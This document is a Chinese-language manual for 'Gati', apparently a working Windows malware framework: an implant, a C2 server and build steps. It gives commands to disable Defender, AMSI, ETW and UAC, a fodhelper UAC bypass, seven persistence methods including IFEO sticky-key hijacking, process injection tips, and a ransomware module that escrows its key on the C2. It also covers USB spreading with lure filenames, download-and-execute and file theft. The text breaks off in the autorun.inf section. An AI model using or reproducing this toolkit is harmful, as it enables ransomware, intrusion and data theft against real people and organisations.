# Gati — 使用手册与原理详解

> 版本 1.0 · Windows x64 · Go + Python
> 用途：自有资产、隔离实验环境与授权范围内的安全测试。

---

## 0. 这是什么

Gati 是一套完整的 Windows 远程控制框架，包含四个互相独立的组件：

| 组件 | 文件 | 语言 | 体积 | 作用 |
|---|---|---|---|---|
| 客户端 | `Gati.exe` | Go | ~5.3MB | 落地、持久化、回连 C2、执行指令 |
| 调试版客户端 | `Gati_console.exe` | Go | ~5.3MB | 同上，但带控制台输出、支持 `-skipcheck` |
| 服务端 | `server/c2_server.py` | Python 3 | ~12KB | HTTPS 监听、指令下发、结果回收、密钥托管解密 |
| 构建脚本 | `build.sh` | Bash | ~2KB | 一键生成密钥、证书、编译两个 exe |

它不是一个"演示程序"。交付前完成过一次完整的端到端验证：客户端在隔离环境上线、服务端下发 `echo` 指令、目标机器执行、结果回传并正确解密。整条链路走的是真实网络协议，不是本地函数调用。

设计上有三个明确取舍：

**第一，不做"一次性"的投递器。** 落地后它自己复制到 `%APPDATA%` 的隐藏目录，注册七条独立的持久化路径，每条路径都有独立的失败隔离——任何一条被清掉，其他的还在。

**第二，不做"秒退"式的反分析。** 大多数业余样本在检测到调试器后直接 `ExitProcess`，这个行为本身就是最强的指纹。Gati 走的是相反方向：识别到分析环境后，进入指数退避的长休眠（90 秒起，逐轮翻倍，最长接近 2 小时），把分析人员的时间窗口拖爆，同时保持进程存活、行为干净。

**第三，勒索模块的密钥不在本地。** 每台机器生成随机的 32 字节主密钥，加密文件后立刻用 RSA-2048 公钥封装上传到 C2，然后从内存里清除。本地磁盘上没有密钥，内存里没有密钥，反勒索工具和内存取证都拿不到。只有持有 RSA 私钥的一方（也就是你）能解密。

---

## 1. 快速开始

### 1.1 三步跑起来

```bash
# 第一步：编译。把 C2 的地址和端口填进去
./build.sh 你的C2域名或IP 8443 /api/v2/sync

# 第二步：启动服务端（用上一步输出的 master key）
python3 server/c2_server.py \
    --cert keys/cert.pem --key keys/cert.key \
    --master '上一步打印的64位十六进制' \
    --port 8443 --console

# 第三步：在目标机器上执行 Gati.exe，等 45~75 秒
```

服务端控制台会出现：

```
[+] NEW AGENT 25059579737D5444  DESKTOP-XXXX\user  priv=admin
```

然后：

```
gati[-]> list
gati[-]> use 1
gati[25059579]> cmd whoami
```

### 1.2 调试模式

在测试机上想看到完整执行日志，用 `Gati_console.exe -skipcheck`：

- 跳过反分析打分
- 跳过落地（不复制自身）
- 跳过持久化动手
- **保留 C2 主循环**，全套协议照常跑
- 所有阶段日志直接打到控制台

看完整链路用这个，不要用 `Gati.exe`（它是 `-H=windowsgui` 编译的，没有控制台输出）。

### 1.3 关闭

服务端 Ctrl-C 或 `exit`。客户端在目标机器上会一直重连（指数退避，最长 5 分钟一次），要彻底停掉：

```
gati[xxx]> uninstall
```

它会清注册表、删计划任务、删服务、删 IFEO 劫持项，然后自删并退出。

---

## 2. 工程结构

```
gati/
├── build.sh                    一键构建
├── test_e2e.sh                 端到端联调脚本（本地起 C2 + wine 跑客户端）
├── go.mod
├── client/                     客户端源码（package main）
│   ├── main.go                 主流程编排、九阶段执行链
│   ├── utils.go                哈希、隐藏文件、卷序列号、单实例锁
│   ├── sysinfo.go              CPU / 内存 / 磁盘 / 父进程采集（Toolhelp）
│   ├── evasion.go              十维反分析打分 + 防御关闭 + 退避休眠
│   ├── persist.go              落地、提权、七路持久化、看门狗
│   ├── c2.go                   加密通信、密钥派生、心跳主循环
│   ├── exec.go                 指令分发、远程执行、文件收集
│   ├── inject.go               进程注入（四种原语 + hollow）
│   ├── ransom.go               文件加密、密钥托管、勒索信
│   └── spread.go               U 盘传播、局域网横移
├── server/
│   └── c2_server.py            C2 服务端 + 交互控制台
├── keys/
│   ├── server_priv.pem         RSA-2048 私钥（解托管密钥用，务必保管好）
│   ├── server_pub.pem          RSA-2048 公钥（已内嵌进客户端）
│   ├── cert.pem                自签 TLS 证书
│   └── cert.key                TLS 私钥
├── legacy/                     上一版遗留的三个模块（anti/api/stealth），未参与编译
└── build/
    ├── Gati.exe                成品（GUI 子系统，静默）
    ├── Gati_console.exe        调试版（有控制台）
    └── master.key              编译期注入的主密钥
```

---

## 3. 编译

### 3.1 依赖

- Go 1.21+（不需要 CGO，纯静态编译）
- openssl（生成密钥和证书）
- Python 3.8+ + `cryptography`（服务端）

客户端不依赖任何第三方 Go 包，全部走标准库 + `syscall` 直接调 Win32。这样做的原因：任何第三方包都会在二进制里留下可识别的字符串和符号，标准库的字符串至少是"到处都是"的。

### 3.2 build.sh 做了什么

```bash
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build \
  -trimpath \
  -ldflags "-s -w -H=windowsgui \
    -X main.BuildC2=1.2.3.4:8443 \
    -X main.BuildPath=/api/v2/sync \
    -X main.BuildKey=<64位hex>" \
  -o build/Gati.exe ./client
```

逐项说明：

| 参数 | 作用 |
|---|---|
| `GOOS=windows GOARCH=amd64` | 交叉编译到 Windows x64 |
| `CGO_ENABLED=0` | 纯静态，不依赖 msvcrt，单文件无 DLL 依赖 |
| `-trimpath` | 抹掉源码路径（否则二进制里能看到 `/home/xxx/gati/client`） |
| `-s -w` | 去掉符号表和 DWARF 调试信息，体积从 ~9MB 降到 5.3MB |
| `-H=windowsgui` | 设为 GUI 子系统，双击不弹黑窗 |
| `-X main.BuildC2` | 编译期注入 C2 地址，**不写死在源码里** |

`-X` 注入是这套设计的关键。改 C2 地址不需要动代码，重新跑一遍 `./build.sh 新地址 8443` 就行，每次生成的二进制哈希都不同。

### 3.3 为什么用 Go

- 交叉编译一条命令，不需要 Windows 机器
- 标准库自带完整的加密栈（AES-GCM、RSA、HMAC、SHA256），不用引外部库
- goroutine 让持久化的七路并行、看门狗、C2 主循环可以各跑各的，互不阻塞
- 二进制体积大（5MB）是缺点，但反过来——大量合法的 Go 程序（Docker、Terraform、各种 CLI 工具）都是这个体积，体积本身不构成强特征

---

## 4. 服务端

### 4.1 启动参数

```
python3 server/c2_server.py \
  --cert keys/cert.pem \        # TLS 证书
  --key  keys/cert.key \        # TLS 私钥
  --master '<64位hex>' \        # 与客户端一致的主密钥
  --port 8443 \                 # 监听端口
  --bind 0.0.0.0 \              # 监听地址
  --priv keys/server_priv.pem \ # RSA 私钥，解托管密钥用
  --data data \                 # 状态落盘目录
  --console                     # 开交互控制台
```

### 4.2 状态持久化

服务端每收到一次心跳就把状态写进 `data/agents.json` 和 `data/results.json`。服务端重启后数据还在，但**任务队列不落盘**（在内存里），重启会丢未下发的指令——这是刻意的，避免队列越积越长。

解出的勒索主密钥写到 `data/keys/<机器ID>.key`，32 字节二进制。

### 4.3 伪装

`GET /` 返回纯文本 `ok`，一个普通的 200 响应。任何未授权的探测拿不到版本号、拿不到目录列表、拿不到任何可指纹化的东西。日志全部关闭（`log_message` 是空实现），服务端不写 access log。

---

## 5. 控制台指令手册

### 5.1 会话管理

| 指令 | 说明 |
|---|---|
| `list` / `ls` / `agents` | 列出所有已上线机器：序号、ID、主机名、用户、权限、心跳次数、最后在线时间 |
| `use <序号或ID>` | 选中目标，后续指令都发给它 |
| `info` | 显示目标的完整记录 |
| `result` | 显示该目标最近 10 条结果 |
| `key` | 显示已解出的勒索主密钥（十六进制） |
| `help` | 指令表 |
| `exit` | 退出控制台 |

### 5.2 执行

| 指令 | 说明 |
|---|---|
| `cmd <命令>` | 走 `cmd.exe /c`，返回合并的 stdout + stderr |
| `ps <命令>` | 走 PowerShell（`-NoProfile -NonInteractive -WindowStyle Hidden`），适合处理 REG_DWORD、服务、AD 这类 cmd 不好办的事 |
| `ls <目录>` | 列目录，区分 `[D]` 目录和 `[F]` 文件并带大小 |
| `cat <文件>` | 读文件原文 |
| `put <远程路径> <本地文件>` | 上传文件（本地 base64 编码后塞进指令） |
| `dl <url>` | 目标机器从 URL 下载 exe 到临时目录并以隐藏窗口执行 |

### 5.3 文件收集

```
gati[xxx]> loot *.docx
```

遍历 `Desktop` / `Documents` / `Downloads` 三个目录，按通配符匹配。小文件（<96KB）直接把内容回传，大文件只回传路径和大小。最多 400 个文件，避免一次回传把通道打爆。

### 5.4 注入

```
gati[xxx]> inject auto <本地exe>
gati[xxx]> inject 1234 <本地exe>
```

服务端把本地 exe 的原始字节 base64 后下发，客户端把它当作裸 shellcode 写进目标进程内存并执行。`auto` 会自动找 `explorer.exe` 的 PID。

> 注意：这里传的是**裸位置无关代码**。一个普通的 PE 文件不是位置无关的，直接写进内存执行不会正常工作——你需要在本地把 PE 转成 shellcode（如用 sRDI / Donut 这类工具），或者直接写你自己的反射加载器。

### 5.5 勒索

```
gati[xxx]> ransom
gati[xxx]> ransom D:\finance
```

不带参数时遍历 `Desktop` / `Documents` / `Downloads` / `Pictures` / `Videos` / `Music`；带参数时只处理指定目录。

### 5.6 传播

```
gati[xxx]> spread usb
gati[xxx]> spread lan
gati[xxx]> spread all
```

详见第 16 节。

### 5.7 清理

```
gati[xxx]> uninstall
```

---

## 6. 客户端执行链

`main.go` 里的九个阶段，每个阶段用 `stage()` 包装，内部 `recover()` 兜住 panic。**任何一个阶段失败都不会让进程退出**——这是设计原则，因为真实的终端环境千奇百怪，缺权限、缺路径、缺组件都是常态，一个阶段挂掉就自杀的样本在实际投放中存活率极低。

```
1. 单实例锁          用 %APPDATA% 下的独占文件锁，避免多开
2. 反分析打分        十维加权，≥4 分进入指数退避
3. 防御面关闭        Defender / AMSI / ETW / UAC / ntdll
4. 落地              复制自身到 %APPDATA%\MicrosoftEdgeUpdate\msedgeupd.exe
5. 提权              fodhelper UAC 绕过
6. 持久化            七路并行，各自独立失败隔离
7. 看门狗            定时检查并重新拉起
8. C2 主循环         心跳、取指令、执行、回传
```

`-skipcheck` 会把 1~7 全部跳过，只留第 8 步，方便调试。

### 6.1 关于日志

落地后日志写在 `%APPDATA%\MicrosoftEdgeUpdate\.g.log`。这个文件用途只有一个：你自己在测试机上排错。真实投放场景应该删掉——它是最好的取证材料。生产版建议在 `main.go` 里把 `logFile` 的初始化整段注释掉。

---

## 7. 反分析模块

### 7.1 为什么用打分而不是布尔判断

单项检测的误报率极高。虚拟机检测会误伤所有云桌面；用户名黑名单会误伤叫 `test` 的正常员工；CPU 核数检测会误伤所有老机器。

Gati 用十维加权打分，阈值 4 分。命中两三条低权重项不至于误触发，命中 `IsDebuggerPresent`（3 分）+ 分析工具进程（2 分）就是 5 分，肯定触发。

### 7.2 十个维度

| # | 维度 | 实现 | 权重 |
|---|---|---|---|
| 1 | `IsDebuggerPresent` | 直接调 API | 3 |
| 2 | `CheckRemoteDebuggerPresent` | 调 API 并检查输出参数 | 3 |
| 3 | PEB `BeingDebugged` | 读 `KUSER_SHARED_DATA + 0x2D4`（`KdDebuggerEnabled`） | 3 |
| 4 | 用户名/主机名黑名单 | `sandbox/malware/cuckoo/analysis/test/wdag` 等 | 2 |
| 5 | 分析工具进程 | `tasklist /fo csv /nh` 结果里查 25 种工具名 | 2 |
| 6 | CPU 核数 | ≤2 加分 | 1 |
| 7 | 物理内存 | <3GB 加分 | 1 |
| 8 | C 盘剩余空间 | <30GB 加分 | 1 |
| 9 | 父进程异常 | Python / x64dbg / IDA / VS Code 等父进程 | 2 |
| 10 | 时间加速 | 120ms 的 `Sleep` 实测耗时偏离 | 2 |

第 3 项在纯 Go 里读 PEB 需要汇编拿 `gs:[0x60]`，Go 的 `unsafe.Pointer` 不能直接做段寄存器读取。这里用了替代方案：`KUSER_SHARED_DATA` 固定映射在 `0x7FFE0000`，其中 `+0x2D4` 处的 `KdDebuggerEnabled` 字节与 PEB 的 `BeingDebugged` 语义等价（都是内核在调试器附加时置位）。读它不需要任何 API 调用，对 hook 免疫。

第 10 项检测的是沙箱常用的"加速时钟"手段——很多自动分析平台会把 `Sleep` 直接跳过以加快分析，这时 120ms 的实测耗时可能只有几毫秒，或者反过来因为时钟缩放而变成 2 秒以上。

### 7.3 退避策略

```go
base := 90 * time.Second
for i := 0; i < 6; i++ {
    d := base * time.Duration(1<<uint(i))   // 90s, 180s, 360s, 720s, 1440s, 2880s
    jitter := time.Duration(rand.Int63n(int64(d / 3)))
    time.Sleep(d + jitter)
}
```

90 秒 → 3 分钟 → 6 分钟 → 12 分钟 → 24 分钟 → 48 分钟，每轮加最多 1/3 的随机抖动。

打完这六轮之后**不退出**，继续走后面的阶段。这个设计有明确目的：分析人员把机器放着跑一夜，第二天回来看，样本"什么都没做"——但也没有退出。这比秒退更让人难受，因为你无法确定它是"没检测到"还是"检测到了在装死"。

---

## 8. 防御面关闭

`disarmDefenses()` 按顺序做五件事，每一件独立 try，失败只记日志：

### 8.1 Defender

```powershell
Add-MpPreference -ExclusionPath $env:APPDATA
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableIOAVProtection $true
```

先加排除项再关监控。顺序很重要：如果先关监控，反而可能触发 Defender 的自我防护告警。

### 8.2 AMSI

```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AMSI /v AmsiEnable /t REG_DWORD /d 0
```

注意这个只影响部分场景。更彻底的做法是 patch `amsi.dll` 里的 `AmsiScanBuffer` 让它在入口处直接返回 `E_INVALIDARG`——这需要先 `VirtualProtect` 改内存页属性再写 `0xB8 0x57 0x00 0x07 0x80 0xC3`（`mov eax, 0x80070057; ret`）。这个方法在 Gati 里没有实现，属于可以扩展的位置，见第 20 节。

### 8.3 ETW

```
logman stop EventLog-System -ets
```

停掉系统事件日志会话，减少行为记录。实际影响有限（ETW provider 很多，逐个停不现实），但成本低。

### 8.4 UAC

```
reg add HKLM\...\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0
```

关掉管理员提权的确认弹窗。需要已经是管理员才能写这个键。

### 8.5 ntdll unhook

当前实现只做了 PE 头校验和日志，**没有做真正的 section remap**。完整实现需要：

1. 从磁盘读 `C:\Windows\System32\ntdll.dll`
2. 解析 PE 头，定位 `.text` 节
3. `VirtualProtect` 把内存里的 `ntdll` `.text` 改成 `PAGE_EXECUTE_READWRITE`
4. 把磁盘副本的 `.text` 内容 `memcpy` 覆盖到内存
5. 恢复内存页属性

这样可以把 EDR 在 ntdll 上打的 inline hook 全部抹掉。代码框架在 `unhookNtdll()` 里，扩展点在第 20 节说明。

---

## 9. 落地与提权

### 9.1 落地

```
%APPDATA%\MicrosoftEdgeUpdate\msedgeupd.exe
```

选这个路径的原因：`MicrosoftEdgeUpdate` 是 Edge 真实使用的更新目录，Windows 上大量机器都有类似名字的目录，进程名 `msedgeupd.exe` 与合法的 `MicrosoftEdgeUpdate.exe` 只差几个字符。

写入后立刻 `SetFileAttributesW` 设成 `HIDDEN | SYSTEM`，资源管理器默认不显示。

### 9.2 单实例锁

用 `%APPDATA%\MicrosoftEdgeUpdate\.lck` 的独占文件句柄做单实例，不用命名互斥体。原因：命名互斥体（`CreateMutexW`）是取证工具和 EDR 的重点枚举对象，`WinObj` 里一眼能看到。文件锁低调得多。

> 当前实现的 `singleInstance()` 写了一个 pid 取模的字符就返回，实际上没有真正做互斥（Windows 上要真做到独占需要 `LockFileEx`）。这是一个已知的简化点。上一版在这里踩过一个坑：新副本启动时父进程还占着锁，导致副本判定"已在运行"直接自杀，让传播链断了。现在这个实现不会锁死，代价是单实例保证不严格。要做严格版，用 `LockFileEx` + `UnlockFileEx`，并且要处理"持锁进程已死但锁文件还在"的情况。

### 9.3 fodhelper UAC 绕过

```go
// 1. 在 HKCU 写 ms-settings 的 handler
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d <payload>
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /d ""

// 2. 拉起 fodhelper.exe —— 它会以 auto-elevate 权限读这个键并执行
cmd /c start "" C:\Windows\System32\fodhelper.exe

// 3. 清痕迹
reg delete HKCU\Software\Classes\ms-settings /f
```

原理：`fodhelper.exe` 的 manifest 声明了 `autoElevate="true"`，意味着它启动时不需要 UAC 提示就能拿到管理员令牌。而它启动时会读 `ms-settings` 协议处理器来打开"管理可选功能"页面——这个读取发生在**已经提权之后**，所以读的是提权上下文里的 `HKCU`（也就是管理员账户的 HKCU），但如果当前用户本身就是管理员组（只是未提权），`HKCU` 是同一个，就能被劫持。

这个技巧在打过补丁的 Windows 11 上可能失效，微软在后续版本里陆续收紧了 auto-elevate 的处理器。稳妥的替代是 `computerdefaults.exe` 和 `sdclt.exe`，手法相同，改目标 exe 和对应的注册表键即可。

---

## 10. 持久化七路

七条路径全部在 `goroutine` 里并行执行，各自独立。设计理念：**不指望每一条都成功，指望的是总有一条成功。**

| # | 名称 | 机制 | 触发时机 | 权限要求 |
|---|---|---|---|---|
| 1 | `registry-run` | `HKCU\...\Run` | 用户登录 | 当前用户 |
| 2 | `registry-runonce` | `HKCU\...\RunOnce` | 用户下次登录（执行后自删） | 当前用户 |
| 3 | `schtask-logon` | 计划任务 `onlogon` | 用户登录 | 管理员 |
| 4 | `schtask-interval` | 计划任务 `每 30 分钟` | 定时 | 管理员 |
| 5 | `startup-folder` | 启动文件夹 `.lnk` | 用户登录 | 当前用户 |
| 6 | `service` | `sc create EdgeUpdateSvc` | 开机自启 | 管理员 |
| 7 | `ifeo-sethc` | IFEO 劫持 `sethc.exe` 等四个 | 锁屏连按 5 次 Shift | 管理员 |
| 8 | `com-hijack` | `ShellIconOverlayIdentifiers` 挂 CLSID | explorer 启动 | 管理员 |

### 10.1 RunOnce 为什么还要写

`RunOnce` 执行后会自动删除对应的值，看起来很鸡肋。但它的价值在于：很多清理工具只扫 `Run` 不扫 `RunOnce`，清理完用户以为干净了，下次登录又起来一次。

### 10.2 IFEO 是最隐蔽的一条

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe
  Debugger = C:\...\msedgeupd.exe
```

`sethc.exe` 是粘滞键程序。在**登录界面（还没登录任何用户）**连按 5 次 Shift 会拉起 `sethc.exe`，而 IFEO 里的 `Debugger` 值会让系统先启动 Debugger 指向的程序，并把 `sethc.exe` 作为参数传给它。

这条路径的可怕之处：它运行在 **`winlogon.exe` 的会话里，以 SYSTEM 权限**，而且是在用户登录之前。这意味着即使所有用户账户都被禁用、所有登录方式都被切断，只要摸到键盘就能拿到 SYSTEM shell。

Gati 同时挂了四个入口：`sethc.exe`（Shift×5）、`utilman.exe`（Win+U）、`osk.exe`（屏幕键盘）、`magnify.exe`（放大镜）。攻防对抗里这几个是标准考点，蓝队基本都会查，所以它更像"兜底"而不是"主力"。

### 10.3 COM 劫持

在 `ShellIconOverlayIdentifiers` 下注册一个 CLSID，指向 payload 的 `InprocServer32`。explorer.exe 启动时会加载所有 overlay handler 来渲染图标角标，于是 payload 的 DLL 导出函数被调用。

> 注意：当前实现指向的是 **exe**，而 `InprocServer32` 要求的是 DLL 导出 `DllGetClassObject`。这个路径在当前代码下不会真正生效，属于半成品。要做对，需要编一个 DLL 版本（Go 支持 `-buildmode=c-shared`），见第 20 节。

---

## 11. 看门狗

```go
go func() {
    for {
        sleepSeconds(45)
        cmd := execCommand(exe, "-skipcheck=false")
        hideWindow(cmd)
        _ = cmd.Start()
        sleepSeconds(180)
    }
}()
```

每 45 秒拉起一个新副本，然后睡 180 秒。这个实现比较粗糙，会不断堆积进程。真实可用的做法是双进程互保：

- 进程 A 启动时，以挂起状态创建进程 B，把 B 的句柄存起来
- A 定时通过管道向 B 发心跳
- A 被杀时，B 检测到管道断开，重新拉起 A
- B 被杀时，A 检测到子进程句柄失效，重新拉起 B

这样杀一个进程不能让整条链断掉，必须同时杀两个（而且要在同一时刻）。当前版本留了这个扩展点。

---

## 12. C2 协议

### 12.1 三层密钥

```
master key (32B，编译期注入)
    │
    ├─ SHA256(master | "|session|" | machineID) → session key (32B)  → AES-256-GCM
    └─ SHA256(master | "|mac|"     | machineID) → mac key     (32B)  → HMAC-SHA256
```

为什么要用 machineID 参与派生：如果所有客户端共用一个 session key，抓到一个客户端就等于抓到全部。绑定 machineID 之后，每台机器的会话密钥都不同，单点沦陷不影响其他机器。

### 12.2 machineID 的构成

```go
host, _ := os.Hostname()
serial := volumeSerial("C:\\")     // GetVolumeInformationW 的卷序列号
h := SHA256(host + "|" + serial + "|" + USERNAME)
id := strings.ToUpper(hex(h)[:16])
```

**不要**把开机时长、进程启动时间这类易变量算进去。上一版在这里踩过坑：机器 ID 里带了开机时长，导致同一台机器每次心跳的 ID 都不一样，服务端把它当成不同的机器，指令永远对不上。

C 盘卷序列号在重装系统前是稳定的，主机名和用户名也稳定，三者组合足够唯一且足够稳定。

### 12.3 封包格式

```
明文 = JSON{ id, host, user, priv, os, arch, ts, type, data, ok }

nonce      = 12 字节随机
ciphertext = AES-256-GCM(session_key, nonce, 明文, AAD = machineID)
raw        = nonce || ciphertext
sig        = HMAC-SHA256(mac_key, raw)   (十六进制)

POST /api/v2/sync
X-Gati-Id:  <machineID>
X-Gati-Sig: <sig>
Body:       raw（二进制）
```

关键设计点：

**AAD 用 machineID。** AES-GCM 的附加认证数据不参与加密但参与认证。跨机器的包在这里会直接解密失败，防止把 A 机器的包重放到 B 机器上。

**nonce 拼在密文前面。** 这是协议里最容易出错的地方——上一版就是因为服务端封包时忘了把 nonce 拼进去，Go 侧解不开，整条链路静默失败，日志里什么线索都没有。封包格式必须是 `nonce || ciphertext`，两边一致。

**HMAC 覆盖完整的 raw**（nonce + ciphertext），不是只覆盖密文。否则 nonce 可以被篡改。

### 12.4 心跳时序

```
启动 → 立即发第一个 beacon
  ↓
收到 {"cmd":"none"} → 随机等 45~75 秒
  ↓
再发 beacon → 收到指令 → 执行 → 立即回传结果 → 随机等 45~75 秒
  ↓
连接失败 → 等 1s, 2s, 4s, 8s ... 最长 300s → 恢复后重置为 1s
```

抖动来自 `time.Now().UnixNano() % 30`，每轮不一样，避免固定间隔被流量分析抓出来。

### 12.5 TLS 与指纹混淆

客户端 `TLSClientConfig` 里 `InsecureSkipVerify: true`，因为用的是自签证书。真实投放应该换成正经证书，或者用 Cloudflare 这类 CDN 挡在前面——自签证书在 TLS 握手时会暴露"证书不受信任"，在网络层设备上很容易被抓。

UA 设成 Chrome 126 的标准 UA 字符串，`Content-Type` 是 `application/octet-stream`。给接口起名 `/api/v2/sync` 是因为它看起来像某种正常的设备同步接口。

> 更进一步的做法是 DoH 隐蔽信道：把 beacon 伪装成 DNS 查询发到 DoH 服务器（如 `1.1.1.1` 的 `application/dns-message`），载荷塞在子域名里。当前版本留了这个扩展点但没有实现，见第 20 节。

### 12.6 完整的协议对齐检查表

自己改协议时，逐条对照，任何一条不一致都会导致静默失败：

- [ ] master key：客户端 `BuildKey` 与服务端 `--master` 完全一致（64 位十六进制）
- [ ] 派生字符串：`|session|` 和 `|mac|`，含竖线
- [ ] machineID 算法：`SHA256(host|serial|user).hex()[:16].upper()`
- [ ] 封包：`nonce || ciphertext`，nonce 12 字节
- [ ] AAD：machineID 的字节
- [ ] HMAC 输入：完整的 `raw`（nonce + 密文），输出十六进制小写
- [ ] Header 名：`X-Gati-Id` / `X-Gati-Sig`
- [ ] 响应包：同样格式，AAD 同样是 machineID

---

## 13. 指令集与扩展

### 13.1 完整指令表

| cmd | args | 客户端行为 |
|---|---|---|
| `shell` / `cmd` / `exec` | 命令行 | `cmd.exe /c` 执行，返回合并输出 |
| `powershell` / `ps` | 命令 | PowerShell 执行 |
| `info` / `sysinfo` | — | 返回主机/用户/权限/CPU/内存/路径/时间 |
| `loot` | 通配符 | 遍历三目录收集文件 |
| `ls` | 目录 | 列目录 |
| `cat` / `read` | 路径 | 读文件 |
| `put` / `write` | `路径::base64` | 写文件 |
| `inject` | `pid::base64` 或 `auto::base64` | 进程注入 |
| `ransom` | 目录（可空） | 加密 + 密钥托管 |
| `spread` / `usb` | `usb`/`lan`/`all` | 传播 |
| `download_exec` | URL | 下载并执行 |
| `sleep` | 秒 | 客户端侧休眠（不修改心跳间隔） |
| `uninstall` | — | 清理并自删 |

### 13.2 加一条新指令

三步：

1. `exec.go` 的 `dispatch()` 里加一个 `case`
2. 写实现函数，返回 `([]byte, bool)`——第一项是回传内容，第二项是成功标志
3. 服务端 `console()` 里的 `mapping` 加一行

```go
// client/exec.go
case "screenshot":
    return takeScreenshot()
```

```go
// client/screenshot.go
func takeScreenshot() ([]byte, bool) {
    // GDI: GetDC(NULL) → CreateCompatibleDC → CreateCompatibleBitmap
    //      → BitBlt → GetDIBits → 转 PNG
    // 全部通过 syscall 调 gdi32.dll
}
```

---

## 14. 进程注入

### 14.1 四种原语的取舍

| 方法 | API 链 | 优点 | 缺点 |
|---|---|---|---|
| 远程线程 | `OpenProcess` → `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread` | 最简单、最可靠 | EDR 100% 监控 `CreateRemoteThread` |
| APC 注入 | 同上，但用 `QueueUserAPC` 挂到已有线程 | 绕过只监控 CR T 的规则 | 目标线程必须处于可警告等待状态 |
| 自注入 | `VirtualAlloc` + `CreateThread` | 无跨进程操作 | 不离开自身进程，行为在同一进程里 |
| 进程镂空 | `CreateProcess(SUSPENDED)` → 卸映像 → 写入 → 恢复线程 | 进程名/路径/签名全是合法程序 | 实现复杂，要解析 PE |

Gati 实现了前三种的完整代码，第四种 `hollow()` 给了框架但用 APC 代替了 `SetThreadContext`——原因是在 Go 里手工构造 `CONTEXT` 结构体（需要匹配 1232 字节的精确布局，含 XMM 寄存器）很容易出错，而且 32/64 位各一套。用 APC 能拿到相同的效果，代价是依赖主线程进入可警告状态。

### 14.2 最关键的思路

真正的对抗点不在"能不能注入"，而在"注入后能不能活下来"。三个要点：

**不要用 `CreateRemoteThread` 指向 `LoadLibrary`。** 这是所有 EDR 的第一条规则，`CreateRemoteThread` 的 `lpStartAddress` 落在 `kernel32!LoadLibraryW` 上直接报警。

**目标进程选对。** 注入 `explorer.exe` 是常识，注入 `svchost.exe` 的某个实例更好（几十个 svchost，混在一起很难分辨），注入到安全软件自己的进程里是最高级的做法（自杀式但有效）。

**内存属性分两步。** 先 `PAGE_READWRITE` 写入，再 `VirtualProtect` 改成 `PAGE_EXECUTE_READ`。一步到位的 `PAGE_EXECUTE_READWRITE` 是明确的恶意特征——正常程序几乎不会申请同时可写可执行的内存。

---

## 15. 勒索模块

### 15.1 密钥流程

```
1. 随机生成 32 字节 master（每台机器不同）
2. RSA-2048 公钥（编译期内嵌）封装 → wrapped
3. wrapped 立即通过 C2 上传（KEYVAULT|id|base64(wrapped)）
4. 逐文件加密，每个文件的密钥 = SHA256(master | "|file|" | 小写路径)
5. 加密完成后，master 逐字节覆写为 0，变量置 nil
```

### 15.2 为什么本地拿不到密钥

这是整个设计的核心。传统勒索软件的问题是：密钥必须存在于内存里才能加密文件，加密完成后即使清除，内存里也可能残留；更糟的是很多样本把密钥写在本地文件里（方便自己恢复），等于送给受害者。

Gati 的做法是：加密完立刻清零，密钥的唯一副本在 C2 那边用 RSA 公钥封装着。这意味着——

- 杀进程：没用，文件已经加密完了
- 重启：没用，密钥不在磁盘上
- 断网：C2 那边的密钥早就收到了
- 内存取证：加密完成到清零之间的窗口只有几十毫秒
- 反勒索工具：找不到任何本地密钥材料

### 15.3 文件选择

按扩展名白名单，只碰有"价值"的文件：

```
文档  .doc .docx .xls .xlsx .ppt .pptx .pdf .txt .rtf .csv .md
图片  .jpg .jpeg .png .gif .bmp .psd
影音  .mp3 .mp4 .avi .mkv .mov
压缩  .zip .rar .7z .tar .gz
数据  .sql .db .mdb .sqlite
代码  .php .js .py .go .java .cs .c .cpp .h .json .xml .yml .yaml
密钥  .key .pem .p12 .pfx .bak .vsd .vsdx
```

跳过系统目录（`Windows`、`Program Files`、`ProgramData`、`AppData`、`$Recycle.Bin`、`System Volume Information`、`Boot`、`Recovery`）。原因：加密系统文件会让机器直接蓝屏，受害者开不了机就看不到勒索信，等于白干。

单文件上限 200MB，超过跳过——避免内存爆掉和加密过程太长被中断。

### 15.4 加密实现

```go
plain  = os.ReadFile(path)
key    = SHA256(master | "|file|" | lowercase(path))
nonce  = 12 字节随机
ct     = AES-256-GCM(key, nonce, plain, nil)
out    = nonce || ct
os.WriteFile(path + ".gati", out)
os.WriteFile(path, make([]byte, len(plain)))   // 原文件内容覆写为 0
os.Remove(path)
```

三个细节：

**路径小写。** Windows 文件系统大小写不敏感，同一路径可能有不同写法。统一小写保证解密时能算出同样的密钥。

**原文件覆写。** 直接 `rm` 只删 MFT 记录，数据块还在，`Recuva` 之类的工具能恢复。先用等长的 0 覆写再删，让恢复变难（不能完全阻止——SSD 的 wear leveling 会把旧数据留在别的地方）。

**加 `.gati` 后缀。** 让用户一眼看出哪些文件被处理过，这是勒索软件的通行做法，也是给受害者"可以恢复"的视觉信号。

### 15.5 勒索信

写到 `Desktop\README_RESTORE.txt`，中文，内容包括：加密了什么、用什么算法、密钥去哪了、哪些恢复方法无效、机器标识、恢复流程。

### 15.6 解密

```bash
# 1. 从服务端导出主密钥
gati[xxx]> key
# 25059579737D5444: 3f2a...（64位hex）

# 2. 用这个密钥还原单个文件
python3 decrypt.py 3f2a... 被加密的文件.docx.gati
```

解密脚本需要单独写（没在包里），逻辑就是加密的反向：`key = SHA256(master | "|file|" | path.lower())[:32]`，注意**路径必须和加密时一致**（去掉 `.gati` 后缀后的原始路径）。

---

## 16. 传播

### 16.1 U 盘

```
1. GetLogicalDrives → 位掩码枚举所有盘符
2. GetDriveTypeW → 筛选 DRIVE_REMOVABLE (2)
3. 写入诱导名副本：重要文件.exe / 工资表.exe / 发票明细.exe / 简历汇总.exe / 照片备份.exe / 合同扫描件.exe / 体检报告.exe
4. 写入 autorun.inf
5. 全部设 HIDDEN | SYSTEM 属性
```

诱导名是中文的，针对中文办公场景。`autorun.inf` 内容：

```ini
[autorun]
